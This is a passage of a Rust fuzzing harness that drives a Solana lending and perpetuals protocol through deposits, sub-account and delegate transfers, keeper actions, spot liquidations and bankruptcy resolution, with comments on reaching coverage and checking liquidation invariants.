                data: ix_data(D_DEPOSIT_INTO_REVENUE_POOL, &amount.to_le_bytes()),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `settle_revenue_to_insurance_fund(spot_market_index)` — permissionless
    /// revenue-pool -> IF-vault sweep, subject to the APR cap.
    pub fn action_settle_revenue_to_if(
        &mut self,
        #[range(0..3u16)] market_index: u16,
        #[range(0..2u8)] setup: u8,
    ) -> bool {
        // COMPOUND: needs a funded revenue pool AND the settle period served.
        //
        // `revenue_settle_period` is 3,600s and the handler requires
        // `now >= last_revenue_settle_ts + period` (keeper.rs:2741). Exactly the
        // same two-warp problem as `remove_if_stake`: `action_warp` tops out at
        // ~2,000s, so no single warp clears it and the fuzzer had to emit two in
        // a row with the pool already funded.
        if setup == 1 {
            let _ = self.action_deposit(0, 5_000 * QUOTE_PRECISION as u64, 0, 0);
            let _ = self.action_deposit_into_revenue_pool(0, 1_000 * QUOTE_PRECISION as u64);
            let _ = self.action_warp(4_999, 1);
            let _ = self.action_warp(4_999, 1);
        }
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new(self.spot_market_pda, false),
                    AccountMeta::new(self.spot_vault_pda, false),
                    AccountMeta::new_readonly(self.signer_pda, false),
                    AccountMeta::new(self.if_vault_pda, false),
                    AccountMeta::new_readonly(token_program_id(), false),
                ],
                data: ix_data(D_SETTLE_REVENUE_TO_IF, &market_index.to_le_bytes()),
            })
            .signers(&[&self.crank.clone()])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `sweep_perp_market_fees(perp_market_index)` — moves the perp market's
    /// standing fee tranches into the quote spot market (the fixture seeds
    /// `fee_ledger.pending_*` so this has something to move).
    pub fn action_sweep_perp_market_fees(&mut self, #[range(0..3u16)] market_index: u16) -> bool {
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new(self.perp_market_pda, false),
                    AccountMeta::new(self.spot_market_pda, false),
                    AccountMeta::new_readonly(self.perp_oracle_pda, false),
                ],
                data: ix_data(D_SWEEP_PERP_MARKET_FEES, &market_index.to_le_bytes()),
            })
            .signers(&[&self.crank.clone()])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `update_spot_market_cumulative_interest` — the interest crank.
    ///
    /// The `oracle` slot is a NAMED account here (not remaining_accounts). Spot
    /// market 0 is `OracleSource::QuoteAsset` with `oracle == Pubkey::default()`,
    /// which is the system program address — an account that exists, and whose
    /// contents the QuoteAsset path never reads.
    pub fn action_update_spot_market_cumulative_interest(&mut self) -> bool {
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new(self.spot_market_pda, false),
                    AccountMeta::new_readonly(system_program_id(), false), // QuoteAsset oracle
                    AccountMeta::new_readonly(self.spot_vault_pda, false),
                ],
                data: ix_data(D_UPDATE_SPOT_MARKET_CUMULATIVE_INTEREST, &[]),
            })
            .signers(&[&self.crank.clone()])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    // ---- sub-accounts -----------------------------------------------------
    //
    // A second sub-account under an existing authority. This covers
    // `initialize_user` AT RUNTIME (setup-time calls happen before coverage
    // tracing, so both init handlers read as 0% however many users the fixture
    // builds), and it is the precondition for the intra-authority transfers,
    // which require both User accounts to share one UserStats.

    /// `initialize_user(sub_account_id, name)` for a non-zero sub-account.
    pub fn action_initialize_sub_account(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(1..4u16)] sub_account_id: u16,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let (sub_pda, _) = Pubkey::find_program_address(
            &[
                b"user",
                user.keypair.pubkey().as_ref(),
                &sub_account_id.to_le_bytes(),
            ],
            &self.program_id,
        );
        let (sub_conditions_pda, _) =
            Pubkey::find_program_address(&[b"user_conditions", sub_pda.as_ref()], &self.program_id);
        let mut args = sub_account_id.to_le_bytes().to_vec();
        args.extend_from_slice(&[0u8; 32]);
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new(sub_pda, false),
                    AccountMeta::new(sub_conditions_pda, false),
                    AccountMeta::new(user.stats_pda, false),
                    AccountMeta::new(self.state_pda(), false),
                    AccountMeta::new_readonly(user.keypair.pubkey(), false),
                    AccountMeta::new(user.keypair.pubkey(), true), // payer
                    AccountMeta::new_readonly(rent_sysvar_id(), false),
                    AccountMeta::new_readonly(system_program_id(), false),
                ],
                data: ix_data(D_INITIALIZE_USER, &args),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `transfer_deposit(market_index, amount)` — move collateral between two
    /// sub-accounts of the SAME authority (pair with
    /// `action_initialize_sub_account`).
    pub fn action_transfer_deposit(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(1..4u16)] sub_account_id: u16,
        #[range(1..1_000_000_000_000u64)] amount: u64,
        #[range(0..2u8)] reverse: u8,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let (sub_pda, _) = Pubkey::find_program_address(
            &[
                b"user",
                user.keypair.pubkey().as_ref(),
                &sub_account_id.to_le_bytes(),
            ],
            &self.program_id,
        );
        let (from, to) = if reverse == 1 {
            (sub_pda, user.user_pda)
        } else {
            (user.user_pda, sub_pda)
        };
        let mut args = 0u16.to_le_bytes().to_vec();
        args.extend_from_slice(&amount.to_le_bytes());
        let mut accounts = vec![
            AccountMeta::new(from, false),
            AccountMeta::new(to, false),
            AccountMeta::new(user.stats_pda, false),
            AccountMeta::new_readonly(user.keypair.pubkey(), true),
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new_readonly(self.spot_vault_pda, false),
        ];
        accounts.extend(self.market_ras(true));
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_TRANSFER_DEPOSIT, &args),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    // ---- account bootstrap for a fresh authority --------------------------

    /// `initialize_user_stats` for an authority that has none yet.
    pub fn action_initialize_user_stats(
        &mut self,
        #[range(0..NUM_FRESH)] fresh_idx: usize,
    ) -> bool {
        let kp = self.fresh[fresh_idx].clone();
        let (stats_pda, _) =
            Pubkey::find_program_address(&[b"user_stats", kp.pubkey().as_ref()], &self.program_id);
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new(stats_pda, false),
                    AccountMeta::new(self.state_pda(), false),
                    AccountMeta::new_readonly(kp.pubkey(), false),
                    AccountMeta::new(kp.pubkey(), true), // payer
                    AccountMeta::new_readonly(rent_sysvar_id(), false),
                    AccountMeta::new_readonly(system_program_id(), false),
                ],
                data: ix_data(D_INITIALIZE_USER_STATS, &[]),
            })
            .signers(&[&kp])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `initialize_user` for a fresh authority (requires its stats first, so the
    /// fuzzer has to discover the ordering).
    pub fn action_initialize_fresh_user(
        &mut self,
        #[range(0..NUM_FRESH)] fresh_idx: usize,
        #[range(0..3u16)] sub_account_id: u16,
    ) -> bool {
        let kp = self.fresh[fresh_idx].clone();
        let (stats_pda, _) =
            Pubkey::find_program_address(&[b"user_stats", kp.pubkey().as_ref()], &self.program_id);
        let (user_pda, _) = Pubkey::find_program_address(
            &[b"user", kp.pubkey().as_ref(), &sub_account_id.to_le_bytes()],
            &self.program_id,
        );
        let (user_conditions_pda, _) = Pubkey::find_program_address(
            &[b"user_conditions", user_pda.as_ref()],
            &self.program_id,
        );
        let mut args = sub_account_id.to_le_bytes().to_vec();
        args.extend_from_slice(&[0u8; 32]);
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new(user_pda, false),
                    AccountMeta::new(user_conditions_pda, false),
                    AccountMeta::new(stats_pda, false),
                    AccountMeta::new(self.state_pda(), false),
                    AccountMeta::new_readonly(kp.pubkey(), false),
                    AccountMeta::new(kp.pubkey(), true),
                    AccountMeta::new_readonly(rent_sysvar_id(), false),
                    AccountMeta::new_readonly(system_program_id(), false),
                ],
                data: ix_data(D_INITIALIZE_USER, &args),
            })
            .signers(&[&kp])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `initialize_referrer_name(name)` — claims a referral handle, PDA-seeded on
    /// the name itself, so the fuzzer also probes the name-collision path.
    pub fn action_initialize_referrer_name(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..4u8)] name_sel: u8,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let mut name = [0u8; 32];
        name[0] = b'a' + name_sel;
        let (referrer_name_pda, _) =
            Pubkey::find_program_address(&[b"referrer_name", &name], &self.program_id);
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new(referrer_name_pda, false),
                    AccountMeta::new(user.user_pda, false),
                    AccountMeta::new(user.stats_pda, false),
                    AccountMeta::new_readonly(user.keypair.pubkey(), true),
                    AccountMeta::new(user.keypair.pubkey(), true), // payer
                    AccountMeta::new_readonly(rent_sysvar_id(), false),
                    AccountMeta::new_readonly(system_program_id(), false),
                ],
                data: ix_data(D_INITIALIZE_REFERRER_NAME, &name),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `transfer_perp_position(market_index, Option<amount>)` — move a perp
    /// position between two sub-accounts of one authority.
    pub fn action_transfer_perp_position(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(1..4u16)] sub_account_id: u16,
        #[range(0..2u8)] with_amount: u8,
        #[range(1..1_000_000_000u64)] amount_mag: u64,
        #[range(0..2u8)] negative: u8,
        #[range(0..2u8)] reverse: u8,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let (sub_pda, _) = Pubkey::find_program_address(
            &[
                b"user",
                user.keypair.pubkey().as_ref(),
                &sub_account_id.to_le_bytes(),
            ],
            &self.program_id,
        );
        let (from, to) = if reverse == 1 {
            (sub_pda, user.user_pda)
        } else {
            (user.user_pda, sub_pda)
        };
        let amount = if negative == 1 {
            -(amount_mag as i64)
        } else {
            amount_mag as i64
        };
        let mut args = 0u16.to_le_bytes().to_vec();
        push_opt(&mut args, with_amount == 1, &amount.to_le_bytes());
        let mut accounts = vec![
            AccountMeta::new(from, false),
            AccountMeta::new(to, false),
            AccountMeta::new(user.stats_pda, false),
            AccountMeta::new_readonly(user.keypair.pubkey(), true),
            AccountMeta::new_readonly(self.state_pda(), false),
        ];
        accounts.extend(self.market_ras(false));
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_TRANSFER_PERP_POSITION, &args),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `transfer_deposit_by_delegate(market_index, amount, equity_floor_delta)` —
    /// the delegate-signed variant. Only legal once the owner has both set a
    /// delegate and enabled `allow_delegate_transfer`, so this composes with
    /// `action_update_user_delegate` / `action_update_user_allow_delegate_transfer`.
    pub fn action_transfer_deposit_by_delegate(
        &mut self,
        #[range(0..NUM_USERS)] owner_idx: usize,
        #[range(1..4u16)] sub_account_id: u16,
        #[range(1..1_000_000_000_000u64)] amount: u64,
        #[range(0..1_000_000_000u64)] equity_floor_delta: u64,
    ) -> bool {
        let owner = self.users[owner_idx].clone();
        // action_update_user_delegate delegates to the NEXT user's authority.
        let delegate = self.users[(owner_idx + 1) % NUM_USERS].clone();

        // COMPOUND: establish our own preconditions. This instruction needs a
        // sub-account to exist AND `has_one = delegate` to hold on BOTH the
        // from- and to-user (instructions/user.rs:4842-4855) AND
        // allow_delegate_transfer set on UserStats. Relying on the fuzzer to
        // emit that exact 4-action prefix is why this handler sat at 4.8%
        // coverage despite working in the census. Each step is idempotent-ish:
        // a redundant call just fails harmlessly and we continue.
        let _ = self.action_initialize_sub_account(owner_idx, sub_account_id);
        let _ = self.action_update_user_delegate(owner_idx, 0, 0);
        let _ = self.action_update_user_delegate(owner_idx, 0, sub_account_id);
        let _ = self.action_update_user_allow_delegate_transfer(owner_idx, 1);
        let (sub_pda, _) = Pubkey::find_program_address(
            &[
                b"user",
                owner.keypair.pubkey().as_ref(),
                &sub_account_id.to_le_bytes(),
            ],
            &self.program_id,
        );
        let mut args = 0u16.to_le_bytes().to_vec();
        args.extend_from_slice(&amount.to_le_bytes());
        args.extend_from_slice(&equity_floor_delta.to_le_bytes());
        let mut accounts = vec![
            AccountMeta::new(owner.user_pda, false),
            AccountMeta::new(sub_pda, false),
            AccountMeta::new_readonly(owner.stats_pda, false),
            AccountMeta::new_readonly(delegate.keypair.pubkey(), true),
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new_readonly(self.spot_vault_pda, false),
        ];
        accounts.extend(self.market_ras(true));
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_TRANSFER_DEPOSIT_BY_DELEGATE, &args),
            })
            .signers(&[&delegate.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    // ---- keeper pokes -----------------------------------------------------

    /// `pause_spot_market_deposit_withdraw` — the permissionless circuit breaker
    /// a keeper trips when the vault balance disagrees with the accounting.
    pub fn action_pause_spot_market_deposit_withdraw(&mut self) -> bool {
        let crank = self.crank.clone();
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new_readonly(crank.pubkey(), true),
                    AccountMeta::new(self.spot_market_pda, false),
                    AccountMeta::new_readonly(self.spot_vault_pda, false),
                ],
                data: ix_data(D_PAUSE_SPOT_MARKET_DEPOSIT_WITHDRAW, &[]),
            })
            .signers(&[&crank])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `trip_equity_floor_breaker` — flags a user whose equity fell through the
    /// configured floor.
    pub fn action_trip_equity_floor_breaker(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..2u8)] floor_sel: u8,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let crank = self.crank.clone();

        // COMPOUND: give the user an equity floor first.
        //
        // The handler needs BOTH `equity_floor > 0` and the user to be *below*
        // it. `equity_floor` has exactly one writer — the warm-admin
        // `update_user_equity_floor` — so with the fixture's default of 0 this
        // handler could only ever reach its first guard. `floor_sel` chooses
        // between a floor the user is comfortably under (breaker should trip)
        // and a token floor they clear (breaker should decline), so both
        // outcomes stay reachable rather than pinning one.
        let floor = if floor_sel == 0 {
            u64::MAX / 2 // far above any collateral the fixture can hold
        } else {
            1
        };
        let admin = self.admin.clone();
        let _ = self
            .ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new_readonly(admin.pubkey(), true),
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new(user.user_pda, false),
                ],
                data: ix_data(D_UPDATE_USER_EQUITY_FLOOR, &floor.to_le_bytes()),
            })
            .signers(&[&admin])
            .send();

        let mut accounts = vec![
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new_readonly(crank.pubkey(), true),
            AccountMeta::new_readonly(user.user_pda, false),
            AccountMeta::new(user.stats_pda, false),
        ];
        accounts.extend(self.market_ras(false));
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_TRIP_EQUITY_FLOOR_BREAKER, &[]),
            })
            .signers(&[&crank])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `force_delete_user` — keeper-driven teardown of an abandoned account
    /// (distinct from the authority's own `delete_user`).
    pub fn action_force_delete_user(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..2u8)] target_fresh: u8,
        #[range(0..NUM_FRESH)] fresh_idx: usize,
    ) -> bool {
        // The handler refuses any account with more than $0.05 of equity, and
        // the fixture's own users are all funded with hundreds of thousands of
        // USDC — so aimed at them it can only ever reach that rejection. A
        // `fresh` authority's User account is bootstrapped empty, which is
        // exactly the abandoned-account shape this instruction exists to clean
        // up. COMPOUND: bootstrap it here rather than hoping the fuzzer emits
        // initialize_user_stats -> initialize_user immediately beforehand.
        let (authority, user_pda, stats_pda) = if target_fresh == 1 {
            let _ = self.action_initialize_user_stats(fresh_idx);
            let _ = self.action_initialize_fresh_user(fresh_idx, 0);
            let kp = self.fresh[fresh_idx].clone();
            let (stats_pda, _) = Pubkey::find_program_address(
                &[b"user_stats", kp.pubkey().as_ref()],
                &self.program_id,
            );
            let (user_pda, _) = Pubkey::find_program_address(
                &[b"user", kp.pubkey().as_ref(), &0u16.to_le_bytes()],
                &self.program_id,
            );
            // The .so is built WITHOUT `anchor-test`, so the ~3-month inactivity
            // gate is compiled in: `slot - user.last_active_slot >= 18_144_000`.
            // `initialize_user` stamps `last_active_slot` to now, so the account
            // this action just created is by definition maximally *active* — the
            // handler would reject it on the very next line. Age it past the
            // gate (4 months of 400ms slots) so the body is reachable.
            let _ = self.action_warp_long(4, 1);
            (kp.pubkey(), user_pda, stats_pda)
        } else {
            let user = self.users[user_idx].clone();
            (user.keypair.pubkey(), user.user_pda, user.stats_pda)
        };
        let crank = self.crank.clone();
        let mut accounts = vec![
            AccountMeta::new(user_pda, false),
            AccountMeta::new(stats_pda, false),
            AccountMeta::new(self.state_pda(), false),
            AccountMeta::new(authority, false),
            AccountMeta::new(crank.pubkey(), true), // keeper
            AccountMeta::new_readonly(self.signer_pda, false),
        ];
        accounts.extend(self.market_ras(false));
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_FORCE_DELETE_USER, &[]),
            })
            .signers(&[&crank])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `update_user_quote_asset_insurance_stake` — refreshes the cached IF stake
    /// on UserStats (drives the fee-tier discount).
    pub fn action_update_user_quote_asset_if_stake(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let crank = self.crank.clone();
        let stake = self.if_stake_pda(&user.keypair.pubkey());
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new(self.spot_market_pda, false),
                    AccountMeta::new(stake, false),
                    AccountMeta::new(user.stats_pda, false),
                    AccountMeta::new_readonly(crank.pubkey(), true),
                    AccountMeta::new(self.if_vault_pda, false),
                ],
                data: ix_data(D_UPDATE_USER_QUOTE_ASSET_IF_STAKE, &[]),
            })
            .signers(&[&crank])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    // ---- spot market 1: price moves, liquidation, swaps --------------------

    /// Move spot market 1's oracle (host-side rewrite, same mechanism as
    /// `action_move_oracle_price`).
    ///
    /// This is the lever that makes a market-1 borrow underwater: drop the price
    /// of a deposited asset, or spike the price of a borrowed one, and the
    /// account's maintenance margin fails — which is the precondition for
    /// `liquidate_spot` and `liquidate_borrow_for_perp_pnl`.
    pub fn action_move_spot_1_oracle_price(
        &mut self,
        #[range(0..2u8)] up: u8,
        // Up to 2% per step. Small enough that every intermediate state is one
        // the protocol could really be in, large enough that a handful of steps
        // crosses a maintenance-margin boundary instead of needing dozens.
        #[range(0..200u64)] bps: u64,
        // Confidence as PPM OF PRICE, which is the unit the program compares in
        // (`conf * BID_ASK_SPREAD_PRECISION / price`). An ABSOLUTE conf decouples
        // from the bound as the price walks, which is half of why the old
        // hard-coded 0.1% check in `oracle_is_fresh` was so far off.
        //
        // `wide_conf == 0` writes conf = 0: a pristine oracle, so the common case
        // keeps full downstream coverage of every margin/funding path. Without
        // this split, a flat draw against a 2% band would make ~98% of oracle
        // writes reject downstream -- the mirror image of the old bug.
        // `wide_conf == 1` straddles the guard rail: 0..5% of price, against a 2%
        // perp band (ContractTier::B) and a 10% spot band (AssetTier::Cross), so
        // BOTH sides of `is_conf_too_large` get explored, and asymmetrically
        // between the two markets.
        #[range(0..2u8)] wide_conf: u8,
        #[range(0..50_000u64)] conf_ppm: u64,
        #[range(0..40u64)] slot_lag: u64,
    ) -> bool {
        let pda = self.spot_1_oracle_pda;
        let conf_ppm = if wide_conf == 1 { conf_ppm } else { 0 };
        self.step_oracle(pda, up == 1, bps, conf_ppm, slot_lag)
    }

    /// Borrow market 1 up to (a fraction of) the initial-margin limit.
    ///
    /// This is the missing precondition for the whole spot-liquidation family.
    /// A borrow sized by the fuzzer is, in practice, always tiny relative to the
    /// collateral — the census borrows 10 SOL against 500k USDC — so the victim
    /// is never close to maintenance and `liquidate_spot`,
    /// `liquidate_borrow_for_perp_pnl` and `liquidate_spot_with_swap_*` can only
    /// ever reach their `SufficientCollateral` rejection.
    ///
    /// Sizing it against the *initial* limit (1.2x liability weight) leaves the
    /// account solvent but only ~9% of price movement away from breaching
    /// maintenance (1.1x) — roughly ten of the sub-1% oracle steps. That keeps
    /// every intermediate state one the protocol could really be in: the borrow
    /// itself is legal, and it is the price move that breaks it.
    ///
    /// `pct` stays fuzzer-driven so both the just-inside and just-outside cases
    /// get explored rather than pinning one hand-picked size.
    pub fn action_borrow_to_margin_limit(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(50..105u64)] pct: u64,
    ) -> bool {
        let user_pda = self.users[user_idx].user_pda;
        let user = match self.read_user(&user_pda) {
            Some(u) => u,
            None => return false,
        };
        let sm0 = match self.read_spot_market() {
            Some(m) => m,
            None => return false,
        };
        // Collateral: the market-0 (quote, $1, weight 1.0) deposit.
        let mut collateral: u128 = 0;
        for sp in user.spot_positions.iter() {
            if sp.market_index != 0 || sp.scaled_balance == 0 {
                continue;
            }
            if sp.balance_type == SpotBalanceType::Deposit {
                collateral = collateral.saturating_add(
                    velocity::math::spot_balance::get_token_amount(
                        sp.scaled_balance as u128,
                        &sm0,
                        &SpotBalanceType::Deposit,
                    )
                    .unwrap_or(0),
                );
            }
        }
        if collateral == 0 {
            return false;
        }

        let price = match read_zc::<PythLazerOracle>(&self.ctx, &self.spot_1_oracle_pda) {
            Some(o) if o.price > 0 => o.price as u128,
            _ => return false,
        };
        // Max borrow VALUE in quote precision, given market 1's 1.2x initial
        // liability weight, then converted to market-1 tokens (9 decimals).
        let max_value = collateral * SPOT_WEIGHT_PRECISION as u128 / 12_000u128;
        let amount = max_value
            .saturating_mul(1_000_000_000u128)
            .checked_div(price)
            .unwrap_or(0)
            .saturating_mul(pct as u128)
            / 100;
        if amount == 0 || amount > u64::MAX as u128 {
            return false;
        }

        // Margin trading must be on before a cross-margin borrow is allowed.
        self.action_update_user_margin_trading_enabled(user_idx, 1);
        self.action_withdraw(user_idx, amount as u64, 1, 0)
    }

    /// `liquidate_spot(asset_market_index, liability_market_index,
    /// liquidator_max_liability_transfer, Option<limit_price>)`.
    ///
    /// Seizes a deposit in one market to repay a borrow in another. Requires the
    /// victim to hold BOTH a deposit and a borrow across the two markets and to
    /// be below maintenance margin — reachable now that market 1 is borrowable
    /// and its price is movable.
    pub fn action_liquidate_spot(
        &mut self,
        #[range(0..NUM_USERS)] victim_idx: usize,
        #[range(0..NUM_USERS)] liq_idx: usize,
        #[range(0..2u16)] asset_market_index: u16,
        #[range(0..2u16)] liability_market_index: u16,
        #[range(1..1_000_000_000_000u64)] max_liability_transfer: u64,
        #[range(0..2u8)] with_limit_price: u8,
        #[range(1..10_000_000u64)] limit_price: u64,
    ) -> bool {
        let victim = self.users[victim_idx].clone();
        let liq = self.users[(liq_idx + 1) % NUM_USERS].clone();
        let mut args = asset_market_index.to_le_bytes().to_vec();
        args.extend_from_slice(&liability_market_index.to_le_bytes());
        args.extend_from_slice(&(max_liability_transfer as u128).to_le_bytes());
        push_opt(&mut args, with_limit_price == 1, &limit_price.to_le_bytes());
        let mut accounts = vec![
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new_readonly(liq.keypair.pubkey(), true),
            AccountMeta::new(liq.user_pda, false),
            AccountMeta::new_readonly(liq.stats_pda, false),
            AccountMeta::new(victim.user_pda, false),
        ];
        accounts.extend(self.market_ras(true));
        // Judge the victim BEFORE the call — a successful liquidation changes
        // the very state the judgement is about.
        let insolvent_before = self.is_unconditionally_insolvent(&victim.user_pda);
        let out = self
            .ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_LIQUIDATE_SPOT, &args),
            })
            .signers(&[&liq.keypair])
            .send();
        match out {
            Ok(o) => {
                // LIQUIDATION LIVENESS (Family XVIII). Error 6004 is
                // `SufficientCollateral` — the protocol asserting the victim is
                // healthy and refusing to liquidate. Filtering on that exact
                // code is what keeps this sharp: every other refusal (nothing to
                // seize, paused market, stale oracle, bad limit price) carries a
                // different code and is ignored, so no guard list is needed for
                // them.
                //
                // Paired with a STRUCTURAL insolvency test, a 6004 here is a
                // direct contradiction: an account holding a liability with no
                // assets cannot be healthy under any valuation. That is a
                // liquidation DoS — the position can never be cleared and the
                // bad debt is stranded.
                if !o.is_success()
                    && o.error_code() == Some(6004)
                    && insolvent_before
                    // BOTH oracles: the new predicate values perp exposure too,
                    // so a stale/uncertain perp oracle would make its verdict
                    // unsound, not just incomplete.
                    && self.oracle_is_fresh(OracleOwner::Spot1)
                    && self.oracle_is_fresh(OracleOwner::Perp)
                {
                    self.liq_refusals.push(
                        "liquidate_spot refused (SufficientCollateral) on an account whose \
                         liabilities exceed its assets at weight 1.0",
                    );
                }
                o.is_success()
            }
            Err(_) => false,
        }
    }

    /// `liquidate_borrow_for_perp_pnl(perp_market_index, spot_market_index,
    /// liquidator_max_liability_transfer, Option<limit_price>)` — settles a
    /// victim's spot borrow against their positive perp PnL.
    pub fn action_liquidate_borrow_for_perp_pnl(
        &mut self,
        #[range(0..NUM_USERS)] victim_idx: usize,
        #[range(0..NUM_USERS)] liq_idx: usize,
        #[range(0..2u16)] spot_market_index: u16,
        #[range(1..1_000_000_000_000u64)] max_liability_transfer: u64,
        #[range(0..2u8)] with_limit_price: u8,
        #[range(1..10_000_000u64)] limit_price: u64,
    ) -> bool {
        let victim = self.users[victim_idx].clone();
        let liq = self.users[(liq_idx + 1) % NUM_USERS].clone();
        let mut args = 0u16.to_le_bytes().to_vec(); // perp_market_index
        args.extend_from_slice(&spot_market_index.to_le_bytes());
        args.extend_from_slice(&(max_liability_transfer as u128).to_le_bytes());
        push_opt(&mut args, with_limit_price == 1, &limit_price.to_le_bytes());
        let mut accounts = vec![
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new_readonly(liq.keypair.pubkey(), true),
            AccountMeta::new(liq.user_pda, false),
            AccountMeta::new(liq.stats_pda, false),
            AccountMeta::new(victim.user_pda, false),
            AccountMeta::new(victim.stats_pda, false),
        ];
        accounts.extend(self.market_ras(true));
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_LIQUIDATE_BORROW_FOR_PERP_PNL, &args),
            })
            .signers(&[&liq.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `begin_swap` + `end_swap`, batched into ONE transaction.
    ///
    /// This pair is only legal together: `begin_swap` inspects the Instructions
    /// sysvar and requires a matching `end_swap` later in the same transaction
    /// (that is how the protocol brackets an external swap). Crucible's
    /// `add_transaction()` + `send_batch()` is what makes that expressible —
    /// sending `begin_swap` on its own can only ever hit the rejection branch.
    ///
    /// No third-party swap runs in between, so the token deltas are zero and
    /// `end_swap` exercises its reconciliation/limit-price logic against a
    /// no-op swap.
    /// Shared account list for `resolve_spot_bankruptcy` / `resolve_perp_bankruptcy`
    /// (both take the `ResolveBankruptcy` context), plus remaining accounts:
    /// oracles -> spot markets -> perp market -> mint. `load_maps` consumes the
    /// remaining accounts by discriminator and `get_token_mint` then reads the
    /// next one, which is why the mint goes last.
    fn resolve_accounts(
        &self,
        liq: &UserAcct,
        victim: &UserAcct,
        market_index: u16,
    ) -> Vec<AccountMeta> {
        let (_m, vault, if_vault, _ta) = self.spot_of(market_index, victim);
        let mint = if market_index == 1 {
            self.sol_mint
        } else {
            self.usdc_mint
        };
        let mut a = vec![
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new_readonly(liq.keypair.pubkey(), true),
            AccountMeta::new(liq.user_pda, false),
            AccountMeta::new(liq.stats_pda, false),
            AccountMeta::new(victim.user_pda, false),
            AccountMeta::new(victim.stats_pda, false),
            AccountMeta::new(vault, false),
            AccountMeta::new(if_vault, false),
            AccountMeta::new_readonly(self.signer_pda, false),
            AccountMeta::new_readonly(token_program_id(), false),
        ];
        a.extend(self.market_ras(true));
        a.push(AccountMeta::new_readonly(mint, false));
        a
    }

    /// `resolve_spot_bankruptcy(market_index)` — clear a bankrupt account's spot
    /// borrow out of the revenue pool, then the shared IF vault, then by
    /// socializing whatever remains onto that market's depositors.
    ///
    /// REACHABLE FROM THIS FIXTURE'S OWN ACTIONS, which is why it is worth
    /// adding: `action_deposit` on market 0 -> `action_borrow_to_margin_limit`
    /// on market 1 -> `action_move_spot_1_oracle_price` upward ->
    /// `action_liquidate_spot` seizes the collateral and flags the victim
    /// Bankrupt (`liquidation_mode.enter_bankruptcy`). Everything downstream of
    /// that flag — `attempt_settle_revenue_to_insurance_fund`, the bankruptcy
    /// tranches, the cumulative-deposit-interest haircut, and `total_social_loss`
    /// accounting — was 0% covered in this harness.
    ///
    /// NOTE the coupling to the interest-monotonicity check in the invariant: this
